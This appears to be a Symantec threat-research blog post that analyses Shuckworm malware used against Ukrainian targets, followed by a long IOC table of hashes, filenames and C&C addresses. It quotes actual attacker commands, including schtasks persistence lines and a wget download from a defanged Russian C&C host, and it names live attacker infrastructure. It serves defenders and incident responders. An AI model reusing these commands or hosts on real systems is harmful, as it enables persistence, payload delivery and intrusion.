                "The file deerbrook.ppt (b46e872375b3c910fb589ab75bf130f7e276c4bcd913705a140ac76d9d373c9e) VBS file contacts a command-and-control (C&C) server at deep-pitched.enarto.ru.",
                "If the C&C server is available, a HTTP POST request is sent to download a payload, which is saved in the %USERPROFILE% folder as deep-sunken.tmp then renamed to deep-sunken.exe and executed.",
                "Upon execution, the file deep-sunken.exe (02c41bddd087522ce60f9376e499dcee6259853dcb50ddad70cb3ef8dd77c200) drops the following files on the compromised computer:",
                "It then creates the following task:",
                "schtasks /Create /SC MINUTE /MO 15 /F /tn BackgroundConfigSurveyor /tr \"wscript.exe [%APPDATA%]\\baby\\baby.dat\" //e:VBScript //b",
                "It then connects to a C&C server (arianat.ru) to download another payload using wget:",
                "basement.exe --user-agent=\"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36 OPR/54.0.2952.64::[VICTIM_ID]::/.beagle/.\"",
                "-q -b -c -t 2 \"hxxp://arianat.ru/baby.php\" -P \"[%APPDATA%]\\baby\"",
                "The baby.dat file is a VBS file that executes baby.cmd, which then downloads and executes the payload from the C&C server.",
                "The vb_baby.vbs file renames the downloaded payload from baby.php to backed.exe.",
                "The downloaded payload (backed.exe) could not be retrieved.",
                "However, the following files were also obtained during our investigation:",
                "The file z4z05jn4.egf.exe (fd9a9dd9c73088d1ffdea85540ee671d8abb6b5ab37d66a760b2350951c784d0) is similar to the previous file (deep-sunken.exe) but with different folders, file names, and C&C server (iruto.ru).",
                "Once executed, the file defiant.exe (a20e38bacc979a5aa18f1954df1a2c0558ba23cdc1503af0ad1021c330f1e455) drops a VBS file in the following locations:",
                "It then creates the following task:",
                "SCHTASKS /CREATE /sc minute /mo 12 /tn \\\"deep-versed\\\" /tr \\\"wscript.exe \\\"[%PUBLIC%]\\\\Pictures\\\\deep-versed.nls\\\" //e:VBScript //b\\\" /F",
                "The dropped file deep-versed.nls (817901df616c77dd1e5694e3d75aebb3a52464c23a06820517108c74edd07fbc) downloads a payload from a C&C server (deep-toned.chehalo.ru) and saves it as deep-green.exe in the following location:",
                "The file deep-green.exe (1ddc9b873fe4f4c8cf8978b6b1bb0e4d9dc07e60ba188ac6a5ad8f162d2a1e8f) contains an UltraVNC binary, which upon execution connects to a repeater (mucoris.ru:5612) using the following command line:",
                "UltraVNC is an open-source remote-administration/remote-desktop-software utility.",
                "A second file named deep-green.exe (f6c56a51c1f0139036e80a517a6634d4d87d05cce17c4ca5adc1055b42bf03aa) contain a Process Explorer (procexp) binary.",
                "Process Explorer is a freeware task manager and system monitor for Microsoft Windows.",
                "A third file called deep-green.exe (de5a53a3b75e3e730755af09e3cacb7e6d171fc9b1853a7200e5dfb9044ab20a) is similar to descend.exe (0d4b8e244f19a009cee50252f81da4a2f481da9ddb9b204ef61448d56340c137) just with different file names and C&C server (deer-lick.chehalo.ru).",
                "The fourth and final file named deep-green.exe (d15a7e69769f4727f7b522995a17a0206ac9450cfb0dfe1fc98fd32272ee5ba7) drops a VBS file in the following location:",
                "It then creates the following task:",
                "\"/CREATE /sc minute /mo 12 /tn \\\"MediaConverter\\\" /tr \\\"wscript.exe \\\"C:\\\\Users\\\\Public\\\\Music\\\\MediaConvertor.dat\\\" //e:VBScript //b \\\" /F\"",
                "The MediaConvertor.dat file searches for removable drives and creates a .lnk file with the following command:",
                "Analysis of the many indicators of compromise (IOCs) uncovered during our investigations have revealed the following patterns, which may be of use when defending networks from Shuckworm attacks:",
                "Most URL C&C IPs belong to the short list of hosting providers listed in the SSU report, namely AS9123 TimeWeb Ltd. (Russia).",
                "Most discovered suspected C&C URLs are IP-based URLs and use a unique URI structure:",
                "http + IP + /<some-word>.php?<some-word>=<1-integer>,<5-7-rand-alphanums> OR",
                "Most suspected malicious files are found in one of a short list of directories:",
                "Nearly all the suspected malicious files are made up of a word beginning with the letter \"d\" and a few are composed of two words separated by a \"-\" (first word also starting with \"d\").",
                "Detected command lines are simple and consist of just the binary path + name; no switches, etc.",
                "Many suspected malicious files have unknown parent process hashes, none of which have available information.",
                "According to a November 2021 report from the SSU, since 2014 the Shuckworm group has been responsible for over 5,000 attacks against more than 1,500 Ukrainian government systems.",
                "As evidenced by Symantec’s recent investigations into attempted Shuckworm attacks against a number of organizations in Ukraine, this activity shows little sign of abating.",
                "For the latest protection updates, please visit the Symantec Protection Bulletin.",
                "SHA256\tFilename\tURL\t b5066b868c7ddbe0d41ee1526d76914f732ed7ce75ccf69caaefe0fed1c9182c  \tdepended.exe  hxxp://92.242.62.131/wordpress.php?is=[REDACTED]  32d24fc67ab84789cd000c22ea377d8c80bcbc27784366a425da2d1874439d09  \tdeputy.exe   40183c41395eccd076a6baf0c16a6c6e7e44f6f6d6366ef885228144f631a9a6  \tdessert.exe  htxxp://78.40.219.12/load.php?individual=[REDACTED]  14061ecc1c870bc941a39451cd6e90c4ec575bbc05c1f2b1362e0d374dc0c06e  \tdeep-thinking.exe  \thxxp://89.223.65.220/cunning.php  ff3e78c8994d3cc1b5c7545ebd5e1dcbab430167f1c3333f4ddad509d06176ed  \tdemanded.exe  hxxp://78.40.219.12/cache.php?induce=[REDACTED]  d9b7644923d2250ba6ea374a05f1d7054cc5704a61f196420670412eb79d1d4e  \tdeep-versed.exe  \thxxp://168.119.228.72/crawled.php  53be28a251260e4f6d818a0dcae30280b5db6f1791780bb9bac0633523bf3ac3  \tdeep-vaulted.exe   c561b862934f329f2f524bb019b24f8bd729c00cf8bea5135a6e51148d5d9208  \tdeepmouthed.nls   5c18878e6d36906f9349ea404f0e3fa0e4b4432e663b3d58a738510b3e3c08e2  \tdeermeat.fly   93d8940cde9e12c2a6ab7a13d5ff0973b907ebecf524b18742746a17209c8e3e  \tavidemux.mov   ae9e9634a1354f5ee89f838f4297f3d38378db17fac73bf2c59cbdd86ea7812c  \tdeering.docx   d83d9fa9cb38abd66e13f4d3b3b6b647facd9ffe28d766685744c6a92e6409b1  \tdeep-thinking.doc   c590724cd5e5813cb43f85a1c89fdc128241398cd677974202524f969813071c  \tdeep-sided.fly   5b61e385d9f2801953a6149a6e63bc3790dc686f147e91163584c7833dd3d7b1  \tdeep-thoughted.ppt   18d9744147bde7d2cd4322391f9ee5fa828b4b23ba669e87a71d39ee84fb1278  \tdeck.lnk   223c55ede1303d47b8516546ee2536cce8539d761790fd3b9657ba5bd869040e  \tdeparted.lnk   2afa203a5589ce0e6c01868b7203edc2fa8faa9c9227d717533cf7e156408e28  \tdeep-six.doc   218b41eabe00c38f42aa51732ac922a43dfab9375ee6db33227a4a66e2c10798  \tdesired.dat   a7955a8ed1a3c4634aed8a353038e5ac39412a88481f453c56c9b9cf7479c342  \tavsvideoeditor.m3u   02c41bddd087522ce60f9376e499dcee6259853dcb50ddad70cb3ef8dd77c200  \tdeep-sunken.exe   43d4d4eeac6ced784911ac4d6b24768d7875347a7d018850d8ee79aaef664286  \tdepart.dat   28f8653c8bf051d19be31b6be9ac00d0220b845757f747358ab116684707fa7a  \tdeprive.dat   ef6073f7372b4774849db8c64a1b33bd473d3ba10ecadbf4f08575b1d8f06c30  \tdescend.dat   73d5bb5d4dfbdfe0fe845c9bfea06739cc767021b50327ddb4ef040940fed22f  \tdeerbrook.ppt   64c291658a2bcba368c87967fd72fabfe0532e4092b4934e91e80cca16ae036d  \tdeserted.exe  hxxp://188.225.86.146/load.php?insurance=[REDACTED]  a078871d89d3f8d22ed77dc331000529a0598f27cf56c6eda32943a9ee8a952c  \tdescend.dat   fa1821b75cc3931a49cead2242a1b0c8976c1e1d4e7425a80e294e8ddc976061  \tdefy.dat   bc469ecc8ed888e3965377d5eb133c97faacabd1fe0ff49ab8d777ba57c16fd3  \tdemand.dat   f2492a8000e0187a733f86dcf3a13206199e3354a86609967fb572e1079feee2  \tdeclare.dat   2f2cad1c9ca8c17aa5bc126df43bfc14dcba3f278d41151bf847278ba1ec940c  \tdeep-grown.exe   f216bafa84123bacaabdf4ad622eb80d0e2d8425fd8937dc100d65bdc1af725e  \tdeep-musing.mp3   f10fea8314f0c904b00b2d10cee1d1320bab7afa36220fb9c9953e3382e62bc4  \tdeep-versed.exe  \thxxp://188.225.45.240/crawled.php  7e703586f6ae3b8c4c0086f5a00254c00debf0273525e4cea216497fe7fcf144  \tdesolate.dat   50e9f2472966d469807c36b3d464e6bf2cf99b98b00cc62e4edda7180bac061b  \tdepended.dat   fce3b4af6b891ee95c1819a1d9ace13b9be20fd50e25ecc3b18b8cb06419f0cb  \tdefined.dat   b1c5659bca42a57a8c9408153126eb60cd88168650d747885e3903e051cad023  \tdemonstrate.dat   5e579ac1dae325b86ed964ea00926e902a6d32a7d37d8eed4b40db7caed303f6  \tdeerbrook.docx   55d8fd4e56523725ad11ccacfb618324360c658c5f44c4f157df6a569cb0277b  \tdestroyed.dat   b6874d2b8ff8c925960ee7e686aecca6a9fc8ab92e5db66fa110da0430ee0edc  \tdeclined.dat   5f9bc1ff8ab3d0ced84262a7f8f70d12a5077761eed33540300f809427153f67  \tdefeat.dat   676dd5c0f2cf64b726c69d448fd585e72ac747b808fdfb0dd6a3a32d93607ab5  \tdeceive.dat   bbf7220635908afede0eebc7e83ba2eb836526490d16b15305cacb96f65d6e6d  \tdeserter.dat   8a2dfe7f8dcc65b1fcfc0e22d21a6846f682c948da4e887a844d54745d85d316  \tdeepness.ini   e427595a3dd2dc501adb4c083308e4900a13ca571e99117e7939964423ef744a  \tdecidedly.dat   89f7d574e51a5ab58296c854ab1889fc6dc2556e8d204ce4b338775b934ad9a8  \tdecorate.lnk   6f4367872de08e9d087f6e8ab874db053eee0cc3aefc80d08f6cf98de7cefd2c  \tdeep-thinking.exe  \thxxp://37.77.105.102/cunning.php  091a1d5b947382d5e95f7e0177e92970618b72f5bb396c2f400fdd496a95c4dc  \tdeliverance.lnk   78c4fcbd6d12c72fcf132b280c0641ea15566d07b779d37cf2c770c8eae941a2  \tdepth.lnk   521d7daa30ee393c9d5f7ce7f0ecb2d59c6698080932c247752768ae876ffd4a  \tdefinite.lnk   a707e779e5b228f670ed09777ccacfb75af8a36c34323af7790290d70bca0083  \tdeepwater.avi   f59b8a22ee610741acdce9a9cec37b63b0684493dd292323c522fdca72afd1b9  \tdefender.exe  hxxp://87.249.54.15/load.php?intelligent=[REDACTED]  5aba3e24b78100834563aa08385ffc7068a241b9bdd99b11a4f527d79f65b4fe  \tdeparture.exe  hxxp://92.53.97.112/index.php?irresponsibility=[REDACTED]  41b1e90461b5738deade6858a626c44ba9050b3ea425dc8092ca0d84daddb236  \tdeerberry.exe  \thxxp://217.25.94.152/customer.php  ad1f796b3590fcee4aeecb321e45481cac5bc022500da2bdc79f768d08081a29  \tdeerskin.exe  \thxxp://188.225.58.51/craft.php  6cd7b58ae6036ccbb8a3f9d28239b26da30d60bbcd710c9ffbec4c88a6b602d4  \tdependent.lnk   1c0110a4f862b54196676c4a77250ea5a5e1ec5be48071f794227769bd25e8de  \tfilm.exe  \thxxp://188.225.25.7/WHATSAAP.php  83e631e396dc33b9b05d9d829ba19a20c4b821be35bf081494a79851f2e00dbe  \tdense.lnk   5271f59f0983382ac3e615265a904d044f8e3825c3d60b3d39a6e9a14bb3e780  \tdeep-versed.exe  \thxxp://89.223.120.224/crawled.php  86f4ca8ea0fc981c804f1e87147aa2c55f73ddfbc2b0be602af240fad6b36b36  \tdecision.txt   b449513b9eeaace805518125def9edf11b63567701a9275b6dd1bddf831f035f  \tdeep-revolving.fly   ae05bb40000bc961ce901c082c3c2adb8bd9d8c4cf3f1addc4e75db6c498479a  \tdemanded.txt   5dec1de8357b7f1868e62d7c8df8163e3e4ba49ec8c127418affd9c53b85201b  \tfilm.exe  \thxxp://188.225.47.250/WHATSAAP.php  ecc9619c534fbaa2f6c630597a58d307badee1ea0a393c10c8c43aa11b65d01b  \tdecisive.dat   f46638bb3b63178b3b0bab886f643b791733178bd5e06fad19e86da978286c52  \tdelightful.lnk   ea22414a4a9bed4bcaf8917a25ac853deb150feb693acc78b1ed8ae07cc2ac27  \tdespair.dat   23a3481740118ae04af1699b7c02e9e450ff965d2ec72324481d5cd051394989  \tdecoy.dat   05f1560026ad88eeb6c038239c87057743d942dbc6b64b14526e13d0415768dc  \tdefense.dat   ecadbc36c2ccab444df9b0ff59bcf5592e61d50b87c07fe1d82342058b6aa261  \tdefined.dat   e4afb1d75061ec13d1988bc4990b352cf2a7d474133c3474fd0c3c2e0672fca0  \tdescent.dat   f9259ff9c86927dcf987123ec193e1270b00ae62b7ad6f2757b5689451be0b8a  \tdesperate.dat   9bdb4c7a5072e64446a851829d1303e123d5d8300b99b5c1de382765e7b06eb3  \tdesigner.dat   0d4b8e244f19a009cee50252f81da4a2f481da9ddb9b204ef61448d56340c137  \tdescend.exe  hxxp://87.249.53.178/set.php?ingratitude=[REDACTED]  82d04cdef87ace65ccf20b3f2623b0115e3413334f681616c67b7f402fad66e0  \tdesolate.exe  hxxp://87.249.53.116/cache.php?insane=[REDACTED]  b63c8fcebf1a419c560b84c5e652fe7235c60473a8a1750d2f1307c05e7a6669  \tdelivery.dat   518370ed9b1a507a0e86e82e2bf8a267251691bce822d4b1419f93563937ebad  \tdelivery.exe  hxxp://87.249.53.216/sys.php?indoors=[REDACTED]  f14ce6142a54878e5dccbfda83b27bc861b57e1be61d5a669a2875a048516e73  \tdeserves.dat   4de8d004ce3d223a67b89cfa45e837a9f90ce13408215e9c98d5b04820c64088  \tdelivery.exe  hxxp://87.249.53.216/sys.php?indoors=[REDACTED]  d26b381e0eb69f5f96cc909103c30976aeba493c6b74e62454ce056c468d18b7  \tdecay.lnk   cdd8844fd9a2680066c4c8730e72a243c3526711664d63414f006a051cd8562a  \tderived.lnk   27a96808f70808396af5c7cfd8e4a5084f2d2f9ccd83637084db05c2325d2832  \tdeserted.lnk   ab2547a7b8603c232b226c4c6c8a5696803997a275d46d4d668d35da695b45fc  \tdeserted.exe  hxxp://188.225.86.146/load.php?insurance=[REDACTED]  605b252e70e37bc187d19984b38be26832b6957ad003799c82f973924b506c44  \tdeed.lnk   c8110e4ecc260eef020253f0f572a2de038fabf6ba48754cbc67bdd7043f938d  \tdeceive.lnk   a2075d2c8e274f0976e3541c80809dd602eb9fcc9159a86dca85fd411d79bc7c  \tdeprive.lnk   94d273d8f09e20151e39616cafa4d366aa340165930c9d688f58eb408dd7ec1e  \tdeclared.exe  hxxp://87.249.44.220/get.php?indignant=[REDACTED]  556151454abeec6ed615489b451d963075cb3ef0b3a17d36d6e0fa81816fe646  \tdeclared.lnk   f6fe720f10737e0fdce27de90bdff3f63948c4b05f74b86b11f9b4439e0943d3  \tdelusion.lnk   6ebe07be97ebfb3ff1646bb9f76f7837b81b47b3e5e0707e86b48be5a12fee33  \tfilm.exe  \thxxp://87.249.49.13/WHATSAAP.php  9ac8ad208c37d0176d2b449cfa175e21881b2b37980a716ab6ba591921da8f6f  \tdense.lnk   5bf5532a1eef0e8b4e648cb0ce392e48d1a5af35c7a6ceedc4464821ff40278c  \tdetachment.exe  hxxp://87.249.44.41/time.php?italian=[REDACTED]  0ace5efc8f17a927bf8c82cc5458c9e25730bf48de36b036a75de241f326d581  \tdeploy.lnk   16a89b871c1570c651f019b82367d00b99b0c11cddd90851839956a5dfc6a1b0  \tdeficiency.lnk   1fcf5b775296efe4eadeb39ac04119632f682b76df7b06127946fde5a89f744d  \tdetachment.lnk   fcd99df8b7c2774fe2c6163303494bf8f163dcd0d0195bdfe5c2870ddc4b54ad  \tmediatv.mov   b55e0dd02e6131465ac31bfb24aa82a72e183b3b6750d0b891a14a193965c918  \tdecency.exe  hxxp://89.223.125.10/time.php?incline=[REDACTED]  612fc508dc63c4c4f8b033c1f5bb2120804263a8949df661b0e3e99e0a8952f5  \tvideotv.m3u  \t\tCustom VBS backdoor - Pterodo  eb5d54ac8a551f6d5c325cf8b0466834bfa0a68e897ed7282b49663058f53daa  \tdepended.lnk   3a4f3a39d32715a57c9985690a3fea76140ba832a1bfbb0c6aa3b6270661e12c  \tderived.exe   17b278045a8814170e06d7532e17b831bede8d968ee1a562ca2e9e9b9634c286  \tderived.exe  hxxp://188.225.86.146/index.php?initial=[REDACTED]  cadc319a0b08c0403de65f2464789ce027bc5b3ec7e515389047e5b2c447b375  \tdesperately.lnk   de85c2b7f4b773721f7ce87480a7d6fc2ce11c3ba15b6c7adfc29ca84cf1425b  \tdetachment.exe   db3a6f57c76cbc0ca5bd8c1602ca99a311da76e816ad30a15eab22b65b3590bb  \tdetachment.lnk   220825ea411ee933315688fbe1af74287bb0703803e514e7f78423d81584581e  \tdecisive.dat   19e471cd9e5ec3b896bf57215974e463dfe6c15cdb2ef8fde61b21a045cb8fe0  \tdefender.dat   57e3e630fa503d93c5847a22f84d5a3129a618f2cdf048837acce94a78204675  \tdefender.exe  hxxp://87.249.54.15/load.php?intelligent=[REDACTED]  91411cb1aaf5d5cac6a11278b6235882d27b74bfaed681b278460113ba8f2b89  \tdecide.lnk   734949521e503e6d5d8409f084dd4a26103693a221f2a0e6e643a45f509f07c5  \tdeparture.lnk   7f68c1f2e3583f0007659a7f70e3291d0f490eb7eea79955214b224649a1cd37  \tdeity.lnk   49aff7b65ed83c30bb04c7db936d64d5fbead7fdb6db54bb93b5f9b59a8f4eee  \tdeclared.lnk   d28efce81bb2bd547354861566aea5f02e23e68fbcb4629b3a7ffb763f934256  \tdecent.lnk   ecec9a36436d41a68a01b91066e5c4d4752fa0282a743628580d179d3bf2358d  \tdemolition.lnk   65b9958a72670e8fb8e3edb6d937b020db7e88b02b574704ec9ceae68c4a4e98  \tdeserter.lnk   715973fe6c2bdb98d9c01546345bb66d7dbb83606b66bded271302aac00eeb6e  \tdeceived.lnk   7e8cd3cc9010e8d55943a491ad3e915f32c6f623fa7a62b247a5d545dfff6fd8  \tdesigned.lnk   47a436b71078dcb85f24dc16e2b7fcb61229f0282a5330ce4f3ddb37a3479801  \tdeerflies.fly   b02a9f20395664f01fd75e7dc2b46a8ddda73221a9d796de5729953d3b3452ee  \tdene.lnk   7188b9e542ab521e23dae4fb4dca88f3f1eb642d20c853f822861e0d19af326b  \tdeerberry.exe  \thxxp://89.223.67.33/customer.php  646f6d84d81d833e1162e56c81c3659f724e7b0801c04abe35492b5e50165663  \tdeny.lnk   44ef2dde18f13cd5f25f7489c72610eedd56e3f4aa3ba1030f549892f43871e0  \tdeny.exe  hxxp://89.223.67.223/cache.php?increasing=[REDACTED]  0a7dd7fbb1ea338aa5c77d19855adaf9864c7a542b68a2818318169b41edb463  \tdelusion.lnk   eef073bf432192d1cc0abb5afac8027f8a954b1fa1e8ca0c0b6cbeb31de54d35  \tdelusion.exe   c5a955b3e71defd69804e101709fdf2b62443ebf944ac00933e77bf43dc44327  \tdeliberate.txt   7be21cd8a700a40c00abe025bb605cc7fbfe799a7465aad755370ba2b808e806  \tdessert.txt   ad5759e59dde3338a7c352417331a2faf1465c20205aa865fd474060f7bac8c7  \tdepended.exe  hxxp://92.242.62.131/wordpress.php?is=[REDACTED]  e7c2db5122a8ac7629c958d1f0d8a4df32c51e5da3be434ba0035c679aac7bce  \tdepended.exe  hxxp://92.242.62.131/wordpress.php?is=[REDACTED]  233924d215d4fcbfbf96b8379a684f6519dd7f217bf54087ca38e23d2f7f6840  \tdepended.exe  hxxp://92.242.62.131/wordpress.php?is=[REDACTED]  94a78d5dce553832d61b59e0dda9ef2c33c10634ba4af3acb7fb7cf43be17a5b  \tdepended.exe  hxxp://92.242.62.131/wordpress.php?is=[REDACTED]  6a64a8e2202db7f3a77d32b4852b71acf620f96580ca015e8bff8f5a09622032  \tdepended.exe  hxxp://92.242.62.131/wordpress.php?is=[REDACTED]  103a6245294ddabf46efe6a13ebf4bb60e922663ce47003411b57f8bfc413e60  \tdepended.exe  hxxp://92.242.62.131/wordpress.php?is=[REDACTED]  afb0f54d41dd85157f32b36d0039bf788268847b8609771918c9e28c90184081  \tdeer.lnk   6aaec1520d036cb403592f937d1ce1f57b09baca440def7cbe9740a874252030  \tdelirium.lnk   d93f7fb038abdb8481e6de0008eaf501508c33c7aca8f40fdd384a7b309b31df  \tdeserves.lnk   85c14f4a7580623f967b9e9f7120a14bd3291f2177298e6bcb32e234af9bb2a8  \tsmycwtexsedfcwu.wsf   b2c4a9242b8dda270b7742b026812011b733fd7aff12d7f4a242678ee954ed8b  \tdepend.lnk   f313221677a7bca63d199ff2e1945866e70d535849d0d64b50b784ecd65a143c  \tdeputy.exe  hxxp://94.228.126.157/cache.php?income=[REDACTED]  cf7d5172dc578138725bcc50bf30a82ad09db0ee7d78c6301de10bdfe8108bc8  \tdeputy.exe  hxxp://94.228.126.157/cache.php?income=[REDACTED]  f933791dfb9ea729e75937923690fe86e69e25b17d85aaa12ace29b0657bcf29  \tdeputy.exe  hxxp://94.228.126.157/cache.php?income=[REDACTED]  6e96621992288bf003be750b29f48bfdea324d9dfdb4951f0fa0de5070d301df  \tdefensive.lnk   33d511a761a663863426dc41499f7d851e9824678ed7d7f481dc4dd680bad9de  \tdeparted.lnk   47fc29821791bb47ce2e9aebb4ee997b163ea2e6988674d84895ee80baa966f0  \tdeity.lnk   583741d4b693d5af79cda7fc534ce2d404074a10e1efe0010c62339da4a26afd  \tdessert.lnk   989362e61facd0a0d4d9edccb7e67e8fe23b639fb67a533f2518d799be150cbc  \tdenote.lnk   f8a90cd8727c9dfad3f850e7195af719a12e4c66f57dcf2671f20b550e0d6578  \tdepart.lnk   557ec4e0314c9f84fa49f9a01287d22d5c3885648a2194fdf9cdbf42356e65a6  \tdelirium.lnk   412a761d6040f097390e4f04b619908856cebc79c76231b5838a96a3b6570b76  \tdenote.lnk   8a4613a05c7dc8c47e8af2fa8244d0f944e8a9230c56c4979e39112a945c415e  \tdelicious.lnk   ebe0d2bc31e6ab5a5be89bb08f902d3abfa73e4c05ccba7f3f527114f5b82003  \tdemanded.lnk   56331bbea28b502cf83c93bb4cb51d0ba67a175d7faa6b5725526574e7040961  \tdelighted.lnk   cf2ef8f895721d0a2479199bd5ed106f5d504b7d42d7cff65e38b8118299ca48  \tdestitute.lnk   8d501ff6fd5559c6a842bd559cd3a3a96a24846c1bc28137b6625f8d65e8e007  \tdecimal.lnk   13cbf286f1c0739b692cb729db517b092dcb11f8291d5a6ea3595bc382821939  \tdesign.lnk   e1fbce179add6e9dc9b58219e14d8bc64f2c8fc979a3c3be97ba14e7f9df2a75  \tdesperate.lnk   6a9fc79e1b1afb091acf3c6c7797061e64f9ee3d5c3bae8c369f77b5f1caa38d  \tdefault.lnk   7f7a7a3fce9c07b82c55f19119c5d9d9a7da70a24d2a6f73d3727fcfdda502e6  \tdestroyer.lnk   4139524d2b3a350913e96a778cdcc41dfaa08542f59bef8ecc12b66a726c549c  \tdeceptive.lnk   6593ff4fe7cea48b838d7cad59a6c65bb1554957fda3d218ff6c073cc80ce9a4  \tdecency.lnk   a9bfa4dd1547341d4d2ba29bbec4603e1dda312d2ab56ee4bb313c75e50969dc  \tdepartments.lnk   bf49e3c80274d3cbda9ea2a60df93c6d38b44ee5cbaa268d9999cb02406f5226  \tdepended.lnk   a21ed6591dcd2a38d3e9f26b8cf36197704a5507da3dd14fee95fbf247bc9eba  \tdepended.exe  hxxp://92.242.62.131/wordpress.php?is=[REDACTED]  b8960abbdd1526fcaf23beaf30483fc43bf3686fba7edc2a9e833b3c8517f5b0  \twebmedia.m3u   00aa1fa6e40954f9e2128bc2c2322ffbffc6c8ecfa169efe60285c6c379c6351  \tdepended.exe  hxxp://92.242.62.131/wordpress.php?is=[REDACTED]  cd1812e376834efd129a8acc8d840eab498bc4f5955adbf2069620e3f084dce9  \ttvplaylist.mov   8662d61e6a53184e6b179c23784a01fd5766539e67d6d9150a60902f2939df4c  \tdepart.lnk   c65c23de51fbd99621f8473c632e4637994deeae73f599296efb8c7b7d00bae7  \tdestruction.lnk   e1671159e4dd5f2095960a042a20e1c7e188697ef88856063f97dfc8cf8739da  \tdefiance.lnk   2c89dab8f7974bf40ae57a4daea817d46fa470df803fcf6e435a2e2cec94068a  \tdeputy.lnk   32d24fc67ab84789cd000c22ea377d8c80bcbc27784366a425da2d1874439d09  \tdeputy.exe   62ecf284fd96e9307f7b6bfac3108a3b93cbe76cb15bd325c5b072ff05e9fcf7  \tdeputy.exe  hxxp://94.228.126.157/cache.php?income=[REDACTED]  1ea3881d5d03214d6b7e37fb7b10221ef51782080a24cc3e275f42a3c1ea99c1  \tplaneta.exe  \thxxp://94.228.126.157/DRIVERS.php  b56531e7fbb4477743f31eda6abef8699f505350b958ba936b9ed94d48a4fa6b  \tplaneta.exe  \thvp://89.223.125.10/DRIVERS.php  7cefcf45949e651e583eadacd0c0ae29d23e5440d30eb9f44e2302894c58e713  \tdelicious.lnk   356140d3c25d86a1ff14a5a34ed99da9398d473241dedb2d1f6413588b347ce2  \tdeployment.lnk   0bfe7d56dcfb616156fc3069a721a97d403f903aaa996cc95bd433fafb74caa4  \tplaneta.exe  \thxxp://89.223.125.10/DRIVERS.php  cb98673e0253dbb8d8f66a982599a02d2539a28d2bfd62e34ffd32df61c34277  \tdelicate.exe  hxxp://89.223.125.10/set.php?invaluable=[REDACTED]  23dd82d729e5f6e40bbf1fc7d2afa593d7f84982d39f938fb706d31b3697134e  \tdelicate.lnk   cfe679cb37b64f96cc5dcaaa660dccb6dd725989197c9de71c89ed541e6da1c8  \tdeer.lnk   09631b2779858e05b39656940b392db85d627ca5fa525f177159677fc70efa39  \tdecency.lnk   1eacf997ad8ee80f414e6b314337042e457d3eed15f6ebd3281960eec2fd35c5  \tdeputy.lnk   7c5909f6ae4e30ed1bd8625571790d7dc8d721da1bc1f9aaaf7fa464a4541ea4  \tdelivered.lnk   46c9937a0b2dceecb78e3e02526a1c8ac6a21d3460b1af52c1e1b996f14a3442  \tdecidedly.lnk   24543fdb4a5cca5d93a9ffc052c9b0c15ce23999d70cfafa05e59cc31627bce5  \tdeployment.lnk   b7bd622b279d3d3927daa64c7c9bc97887d85fccf360d46158e1c01c96bb6cb5  \tdeliver.lnk   ead73958ddba93afc032bdf8ee997510548447a41f3a3dc5a8005a9cb11dced8  \tdeputy.lnk   49dc7b4ae49deedd74e08760e9723cdea4c61286bd3a98149ea9abdf6b81befb  \tdene.lnk   e42a68db9a99b11f97ea2f3ed890cb113b560acf268d1364166152416f61cc16  \tdeliberately.lnk   d546e63f4d4922f0eeeed4203991384a503182fa735c4d779ddc111f04926ecf  \tdegree.lnk   9b8d589cd1799935d8cd23852abdd8a055612538536f8b90221351f97d6802aa  \tdedicate.lnk   b46e872375b3c910fb589ab75bf130f7e276c4bcd913705a140ac76d9d373c9e   deerbrook.ppt  a20e38bacc979a5aa18f1954df1a2c0558ba23cdc1503af0ad1021c330f1e455   defiant.exe  817901df616c77dd1e5694e3d75aebb3a52464c23a06820517108c74edd07fbc   deep-versed.nls  fd9a9dd9c73088d1ffdea85540ee671d8abb6b5ab37d66a760b2350951c784d0   z4z05jn4.egf.exe  1ddc9b873fe4f4c8cf8978b6b1bb0e4d9dc07e60ba188ac6a5ad8f162d2a1e8f   deep-green.exe  f6c56a51c1f0139036e80a517a6634d4d87d05cce17c4ca5adc1055b42bf03aa   deep-green.exe  de5a53a3b75e3e730755af09e3cacb7e6d171fc9b1853a7200e5dfb9044ab20a   deep-green.exe  d15a7e69769f4727f7b522995a17a0206ac9450cfb0dfe1fc98fd32272ee5ba7   deep-green.exe  45f8a037bf622bbee8ea50e069ffd74f8ffcb2273b3d3a1bd961b5f725de04a0   BAT file  e78a4ac2af9e94e7ae2c8e8d7099c6449562dc78cd3ce325e7d70da58773740c   PE file  966474abe018536e7224466129b9351a4bd850270f66fbfa206c1279c4f2a04a   Text file - hateful.ico  58075401e25cfe4a3abf6864860fc846ec313dc1add20d686990f0d626f2a597   VBS file - saviour.ico  119f9f69e6fa1f02c1940d1d222ecf67d739c7d240b5ac8d7ec862998fee064d   PE file - 2444.tmp  d68688e9316c2712a27bd4bbd5e3ed762fb39bd34f1811ce4c0f0ca0480effb5   BAT file - 32161.cmd  d8a01f69840c07ace6ae33e2f76e832c22d4513c07e252b6730b6de51c2e4385   PE file - MSRC4Plugin_for_sc.dsm  99c9440a84cdc428ce140de901452eb334faec49f1f6258acdde1ddcbb34376e   key file - rc4.key  e9b97d421e01a808bf62e8eb4534c1fc91c7158e1faac57dd7450f285a31041c   INI file - UltraVNC.ini  0632bc84e157bfce9a3d0600997faa21e4edb77865f67f598c7ca52f2f351e83   VBS file - hateful.txt  db49fe96714ebd9707e5cd31e7f366016e45926ff577cce9c34a73ee1b6efcf9   VBS file - 8528.txt  98fd1d7dad30f0e68ff190f3891dfef262029f700b75e1958545fd580b0a4a2d   VBS file - scatter.rar  476e78c8777a6e344177c71953b27c27b4b572985e70e8a8594ff8b86bf66aa3   Text file - savagely.rar  33d30cc71324c24c74d7575d7bfaebd578607122cc581f093267a9c511da044b   HTA file - procexp.hta  4b86b7902adda55a9672c41bdfd6eff0ff3d6aa6a5accf8cf2b029e17d9cb25a   PE file  7f97d312d6d7515ecfe7b787a0211c9e8702687e3611e38095d4f16212d75f42   BAT file    deep-pitched.enarto.ru    arianat.ru    deep-toned.chehalo.ru    iruto.ru    deer-lick.chehalo.ru About the AuthorThreat Hunter TeamSymantecThe Threat Hunter Team is a group of security experts within Symantec whose mission is to investigate targeted attacks, drive enhanced protection in Symantec products, and offer analysis that helps customers respond to attacks.Want to comment on this post?We encourage you to share your thoughts on your favorite social platform.Related Blog PostsPosted: 3 Feb, 202211 Min ReadAntlion: Chinese APT Uses Custom Backdoor to Target Financial Institutions in TaiwanPosted: 19 Jan, 20226 Min ReadThe Threat Landscape in 2021Posted: 23 Dec, 20214 Min ReadLog4j Vulnerabilities: Attack InsightsPosted: 16 